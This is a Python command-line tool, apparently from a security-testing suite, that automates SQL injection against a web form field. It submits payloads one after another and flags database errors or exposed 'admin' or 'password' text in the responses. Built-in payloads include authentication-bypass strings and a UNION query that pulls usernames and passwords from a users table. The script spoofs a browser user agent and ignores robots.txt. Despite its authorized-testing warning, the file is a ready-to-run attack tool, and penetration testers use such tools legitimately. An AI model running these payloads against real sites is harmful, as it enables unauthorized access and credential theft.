#!/usr/bin/env python3
"""
SQL Injection Attack Simulation Tool

This script simulates SQL injection attacks on web applications by submitting various
SQL injection payloads to a specified form field. It can help identify vulnerabilities
in web applications that do not properly sanitize user input before using it in SQL queries.

The tool supports multiple attack vectors, including:
- Basic authentication bypass (OR 1=1)
- Union-based attacks
- Error-based attacks
- Blind SQL injection tests
- Time-based attacks

WARNING: This tool is for educational and authorized security testing purposes only.
Unauthorized use against systems without explicit permission is illegal and unethical.

Usage:
    python sql_injection.py <targetURL> <control_name> [options] [attack_strings]

Arguments:
    targetURL: The URL of the target web application
    control_name: The name of the form control to inject SQL payloads into

Options:
    -f, --file <path>: Path to a file containing SQL injection payloads (one per line)
    -d, --delay <seconds>: Delay between requests in seconds (default: 1.0)
    -t, --timeout <seconds>: Request timeout in seconds (default: 30)
    -a, --user-agent <string>: Custom User-Agent string
    -p, --proxy <proxy_url>: Use a proxy for requests (e.g., http://127.0.0.1:8080)
    -v, --verbose: Enable verbose output
    -h, --help: Show this help message

Examples:
    python sql_injection.py http://example.com/login username "' OR '1'='1"
    python sql_injection.py http://example.com/search query -f payloads.txt -d 2.0

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import sys
import os
import time
import argparse
import logging
from typing import List, Dict, Optional, Union, Any
from urllib.parse import urlparse

# Import mechanize with error handling
try:
    import mechanize
    from mechanize import Browser, HTTPError, URLError
except ImportError:
    print("Error: This script requires the mechanize library.")
    print("Install it using: pip install mechanize")
    sys.exit(1)

# Configure logging
try:
    from logger import get_logger
except ImportError:
    # Fallback logging if the centralized logger is not available
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

# Get logger for this module
logger = get_logger(__name__)

class SQLInjectionAttack:
    """
    A class that implements SQL injection attack simulation.
    
    This class provides methods to configure and execute SQL injection attacks
    against a target web application. It allows customization of various attack parameters
    and provides detailed feedback on the attack progress.
    
    Attributes:
        target_url (str): The URL of the target web application
        control_name (str): The name of the form control to inject SQL payloads into
        delay (float): Delay between requests in seconds
        timeout (int): Request timeout in seconds
        user_agent (str): Custom User-Agent string
        proxy (str): Proxy URL for requests
        verbose (bool): Whether to enable verbose output
    """
    
    def __init__(self, target_url: str, control_name: str, delay: float = 1.0, 
                 timeout: int = 30, user_agent: Optional[str] = None, 
                 proxy: Optional[str] = None, verbose: bool = False):
        """
        Initialize the SQL injection attack with the specified parameters.
        
        Args:
            target_url (str): The URL of the target web application
            control_name (str): The name of the form control to inject SQL payloads into
            delay (float): Delay between requests in seconds (default: 1.0)
            timeout (int): Request timeout in seconds (default: 30)
            user_agent (Optional[str]): Custom User-Agent string (default: None)
            proxy (Optional[str]): Proxy URL for requests (default: None)
            verbose (bool): Whether to enable verbose output (default: False)
        """
        self.target_url = target_url
        self.control_name = control_name
        self.delay = max(0.0, delay)  # Ensure non-negative delay
        self.timeout = max(1, timeout)  # Ensure positive timeout
        self.user_agent = user_agent
        self.proxy = proxy
        self.verbose = verbose
        
        # Initialize browser
        self.browser = self._setup_browser()
        
        # Statistics
        self.successful_attacks = 0
        self.failed_attacks = 0
        self.total_attacks = 0
        
    def _setup_browser(self) -> Browser:
        """
        Set up and configure the browser for the attack.
        
        Returns:
            Browser: Configured mechanize browser instance
        """
        browser = mechanize.Browser()
        
        # Browser options
        browser.set_handle_equiv(True)
        browser.set_handle_redirect(True)
        browser.set_handle_referer(True)
        browser.set_handle_robots(False)  # Ignore robots.txt
        
        # Set timeout
        browser.set_timeout(self.timeout)
        
        # Set user agent if provided
        if self.user_agent:
            browser.addheaders = [('User-agent', self.user_agent)]
        else:
            # Use a common browser user agent
            browser.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')]
        
        # Set proxy if provided
        if self.proxy:
            browser.set_proxies({'http': self.proxy, 'https': self.proxy})
            
        if self.verbose:
            logger.info(f"Browser configured with timeout={self.timeout}s, user-agent='{browser.addheaders[0][1]}'")
            if self.proxy:
                logger.info(f"Using proxy: {self.proxy}")
                
        return browser
    
    def validate_target(self) -> bool:
        """
        Validate that the target URL is accessible and contains a form with the specified control.
        
        Returns:
            bool: True if the target is valid, False otherwise
        """
        try:
            # Parse URL to validate format
            parsed_url = urlparse(self.target_url)
            if not all([parsed_url.scheme, parsed_url.netloc]):
                logger.error(f"Invalid URL format: {self.target_url}")
                return False
                
            # Try to open the URL
            logger.info(f"Validating target URL: {self.target_url}")
            self.browser.open(self.target_url)
            
            # Check if there's at least one form
            if not list(self.browser.forms()):
                logger.error(f"No forms found at {self.target_url}")
                return False
                
            # Try to select the first form
            self.browser.select_form(nr=0)
            
            # Check if the control exists in the form
            try:
                self.browser[self.control_name]
                logger.info(f"Found form control: {self.control_name}")
                return True
            except mechanize.ControlNotFoundError:
                logger.error(f"Control '{self.control_name}' not found in the form")
                return False
                
        except (mechanize.HTTPError, mechanize.URLError) as e:
            logger.error(f"Error accessing {self.target_url}: {str(e)}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error validating target: {str(e)}")
            return False
    
    def execute_attack(self, sql_attack_str: str) -> Optional[str]:
        """
        Execute a SQL injection attack with the specified payload.
        
        Args:
            sql_attack_str (str): The SQL injection payload to test
            
        Returns:
            Optional[str]: The response content if successful, None otherwise
        """
        self.total_attacks += 1
        
        try:
            logger.info(f"Executing attack with payload: {sql_attack_str}")
            
            # Open the URL and select the form
            self.browser.open(self.target_url)
            self.browser.select_form(nr=0)
            
            # Set the attack payload
            self.browser[self.control_name] = sql_attack_str
            
            # Submit the form
            if self.verbose:
                logger.info(f"Submitting form with payload: {sql_attack_str}")
                
            response = self.browser.submit()
            
            # Read the response
            content = response.read().decode('utf-8', errors='replace')
            
            # Check response code
            response_code = response.code
            if self.verbose:
                logger.info(f"Response code: {response_code}")
                
            # Log success
            self.successful_attacks += 1
            
            # Return the response content
            return content
            
        except mechanize.HTTPError as e:
            logger.error(f"HTTP error during attack: {str(e)}")
            self.failed_attacks += 1
            return None
        except mechanize.URLError as e:
            logger.error(f"URL error during attack: {str(e)}")
            self.failed_attacks += 1
            return None
        except Exception as e:
            logger.error(f"Unexpected error during attack: {str(e)}")
            self.failed_attacks += 1
            return None
    
    def analyze_response(self, payload: str, response_content: str) -> None:
        """
        Analyze the response content for signs of SQL injection vulnerability.
        
        Args:
            payload (str): The SQL injection payload used
            response_content (str): The response content to analyze
        """
        if not response_content:
            return
            
        # Look for common SQL error messages
        sql_error_indicators = [
            "SQL syntax", "mysql_fetch", "ORA-", "Oracle error",
            "Microsoft SQL", "ODBC Driver", "DB2 SQL error", "SQLite3::",
            "PostgreSQL", "PSQLException", "PLS-", "MySQL Error",
            "You have an error in your SQL syntax"
        ]
        
        # Check for error messages
        for indicator in sql_error_indicators:
            if indicator.lower() in response_content.lower():
                logger.warning(f"Potential SQL injection vulnerability detected! Error indicator: {indicator}")
                logger.warning(f"Payload: {payload}")
                return
                
        # Check for common success indicators
        if "admin" in response_content.lower() or "password" in response_content.lower():
            logger.warning(f"Potential sensitive data exposure detected in response!")
            logger.warning(f"Payload: {payload}")
            
        # Log response length for potential blind SQL injection analysis
        if self.verbose:
            logger.info(f"Response length: {len(response_content)} bytes")


def execute_attack(url: str, control_name: str, sql_attack_str: str, 
                   delay: float = 1.0, timeout: int = 30, 
                   user_agent: Optional[str] = None, proxy: Optional[str] = None, 
                   verbose: bool = False) -> None:
    """
    Execute a SQL injection attack on the specified target URL.

    This function submits a SQL injection payload to a specified form control
    and analyzes the response content for signs of vulnerability.

    Args:
        url (str): The URL of the target web application
        control_name (str): The name of the form control to inject SQL payloads into
        sql_attack_str (str): The SQL injection payload to test
        delay (float): Delay between requests in seconds (default: 1.0)
        timeout (int): Request timeout in seconds (default: 30)
        user_agent (Optional[str]): Custom User-Agent string (default: None)
        proxy (Optional[str]): Proxy URL for requests (default: None)
        verbose (bool): Whether to enable verbose output (default: False)
    """
    # Create an attack instance
    attack = SQLInjectionAttack(
        target_url=url,
        control_name=control_name,
        delay=delay,
        timeout=timeout,
        user_agent=user_agent,
        proxy=proxy,
        verbose=verbose
    )
    
    # Validate the target
    if not attack.validate_target():
        logger.error("Target validation failed. Aborting attack.")
        return
    
    # Execute the attack
    response = attack.execute_attack(sql_attack_str)
    
    # Analyze the response
    if response:
        attack.analyze_response(sql_attack_str, response)
        
        # Print a summary of the response (truncated if too long)
        max_length = 500
        if len(response) > max_length and not verbose:
            logger.info(f"Response (truncated): {response[:max_length]}...")
            logger.info(f"Response length: {len(response)} bytes")
        elif verbose:
            logger.info(f"Response: {response}")
    
    # Wait for the specified delay
    if delay > 0:
        if verbose:
            logger.info(f"Waiting {delay} seconds before next request...")
        time.sleep(delay)

def start_attack(url: str, control_name: str, attack_queries: List[str], 
               delay: float = 1.0, timeout: int = 30, 
               user_agent: Optional[str] = None, proxy: Optional[str] = None, 
               verbose: bool = False) -> None:
    """
    Start a SQL injection attack on the specified target URL.

    This function iterates through a list of SQL injection payloads and
    executes an attack on the target URL for each payload.

    Args:
        url (str): The URL of the target web application
        control_name (str): The name of the form control to inject SQL payloads into
        attack_queries (List[str]): A list of SQL injection payloads to test
        delay (float): Delay between requests in seconds (default: 1.0)
        timeout (int): Request timeout in seconds (default: 30)
        user_agent (Optional[str]): Custom User-Agent string (default: None)
        proxy (Optional[str]): Proxy URL for requests (default: None)
        verbose (bool): Whether to enable verbose output (default: False)
    """
    if not attack_queries:
        logger.error("No attack queries provided. Aborting.")
        return
        
    logger.info(f"Starting SQL injection attack against {url}")
    logger.info(f"Target form control: {control_name}")
    logger.info(f"Number of attack payloads: {len(attack_queries)}")
    
    # Create an attack instance for validation
    attack = SQLInjectionAttack(
        target_url=url,
        control_name=control_name,
        delay=delay,
        timeout=timeout,
        user_agent=user_agent,
        proxy=proxy,
        verbose=verbose
    )
    
    # Validate the target once before starting the attack
    if not attack.validate_target():
        logger.error("Target validation failed. Aborting attack.")
        return
    
    # Execute attacks with each payload
    start_time = time.time()
    for i, query in enumerate(attack_queries, 1):
        logger.info(f"\nAttack {i}/{len(attack_queries)}: {query}")
        
        # Execute the attack
        response = attack.execute_attack(query)
        
        # Analyze the response
        if response:
            attack.analyze_response(query, response)
            
            # Print a summary of the response (truncated if too long)
            max_length = 500
            if len(response) > max_length and not verbose:
                logger.info(f"Response (truncated): {response[:max_length]}...")
                logger.info(f"Response length: {len(response)} bytes")
            elif verbose:
                logger.info(f"Response: {response}")
        
        # Wait for the specified delay between attacks
        if i < len(attack_queries) and delay > 0:
            if verbose:
                logger.info(f"Waiting {delay} seconds before next attack...")
            time.sleep(delay)
    
    # Print attack statistics
    end_time = time.time()
    duration = end_time - start_time
    
    logger.info("\n--- SQL Injection Attack Summary ---")
    logger.info(f"Total attacks: {attack.total_attacks}")
    logger.info(f"Successful requests: {attack.successful_attacks}")
    logger.info(f"Failed requests: {attack.failed_attacks}")
    logger.info(f"Duration: {duration:.2f} seconds")
    logger.info("-----------------------------------")


def load_attack_queries(file_path: str) -> List[str]:
    """
    Load SQL injection payloads from a file.
    
    Args:
        file_path (str): Path to the file containing SQL injection payloads
        
    Returns:
        List[str]: List of SQL injection payloads
    """
    queries = []
    
    try:
        if not os.path.exists(file_path):
            logger.error(f"File not found: {file_path}")
            return queries
            
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):  # Skip empty lines and comments
                    queries.append(line)
                    
        logger.info(f"Loaded {len(queries)} attack payloads from {file_path}")
        return queries
        
    except Exception as e:
        logger.error(f"Error loading attack queries from {file_path}: {str(e)}")
        return queries

def parse_arguments() -> argparse.Namespace:
    """
    Parse command-line arguments for the SQL injection attack.
    
    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(
        description="SQL Injection Attack Simulation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python sql_injection.py http://example.com/login username \"' OR '1'='1\"\n"
            "  python sql_injection.py http://example.com/search query -f payloads.txt -d 2.0\n\n"
            "WARNING: Use only for educational purposes or authorized security testing."
        )
    )
    
    parser.add_argument(
        "target_url",
        help="The URL of the target web application"
    )
    
    parser.add_argument(
        "control_name",
        help="The name of the form control to inject SQL payloads into"
    )
    
    parser.add_argument(
        "attack_strings",
        nargs="*",
        help="SQL injection payloads to test (comma-separated)"
    )
    
    parser.add_argument(
        "-f", "--file",
        help="Path to a file containing SQL injection payloads (one per line)"
    )
    
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=1.0,
        help="Delay between requests in seconds (default: 1.0)"
    )
    
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)"
    )
    
    parser.add_argument(
        "-a", "--user-agent",
        help="Custom User-Agent string"
    )
    
    parser.add_argument(
        "-p", "--proxy",
        help="Use a proxy for requests (e.g., http://127.0.0.1:8080)"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    return parser.parse_args()


if __name__ == '__main__':
    # Parse command-line arguments
    args = parse_arguments()
    
    # Set up logging level based on verbosity
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Collect attack queries
    attack_queries = []
    
    # Load queries from file if specified
    if args.file:
        attack_queries.extend(load_attack_queries(args.file))
    
    # Add queries from command line
    if args.attack_strings:
        for arg in args.attack_strings:
            # Split by comma if present
            for query in arg.split(','):
                if query.strip():
                    attack_queries.append(query.strip())
    
    # If no queries provided, use default file
    if not attack_queries:
        default_query_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sql-queries.txt")
        if os.path.exists(default_query_file):
            attack_queries.extend(load_attack_queries(default_query_file))
        else:
            # Default payloads if no file exists
            attack_queries = [
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin' --",
                "1' OR '1' = '1",
                "1' OR '1' = '1' --",
                "' UNION SELECT 1,2,3 --",
                "' UNION SELECT username,password,3 FROM users --"
            ]
            logger.info(f"Using {len(attack_queries)} built-in SQL injection payloads")
    
    # Execute the attack
    start_attack(
        url=args.target_url,
        control_name=args.control_name,
        attack_queries=attack_queries,
        delay=args.delay,
        timeout=args.timeout,
        user_agent=args.user_agent,
        proxy=args.proxy,
        verbose=args.verbose
    )